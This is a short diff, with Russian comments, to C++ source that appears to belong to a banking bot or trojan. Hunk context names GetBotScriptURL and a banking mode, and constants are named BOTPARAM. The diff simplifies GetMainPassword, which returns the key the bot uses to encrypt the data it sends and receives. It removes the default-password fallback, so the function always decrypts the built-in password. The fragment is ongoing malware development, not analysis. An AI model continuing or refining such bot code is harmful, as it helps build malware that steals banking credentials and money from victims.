@@ -714,26 +714,13 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path, bool CheckBankingMode)
 
 // Функция возвращает пароль для криптования принимаемых/отправляемых данных
 
-PCHAR GetMainPassword(bool NotNULL)
+PCHAR GetMainPassword()
 {
 	// Функция возвращает пароль шифрования
-	PCHAR Passw = NULL;
 
-	// Проверяем задан ли в боте пароль
-	if (!STRA::IsEmpty(MainPassword) && STRA::Hash(MainPassword) != BOTPARAM_HASH_PASSWORD)
-	{
-		Passw = STR::New(MainPassword);
-        if (BOTPARAM_ENCRYPTED_PASSWORD)
-			DecryptStr(MainPassword, Passw);
-	}
-
-
-	// В случае необходимости возвращаем cтандартный пароль
-	if (NotNULL && STRA::IsEmpty(Passw))
-	{
-    	Passw = STR::New((PCHAR)DefaultPassword);
-    }
-
+	PCHAR Passw = STR::New(MainPassword);
+	if (BOTPARAM_ENCRYPTED_PASSWORD)
+		DecryptStr(MainPassword, Passw);
 
 	return Passw;
 }
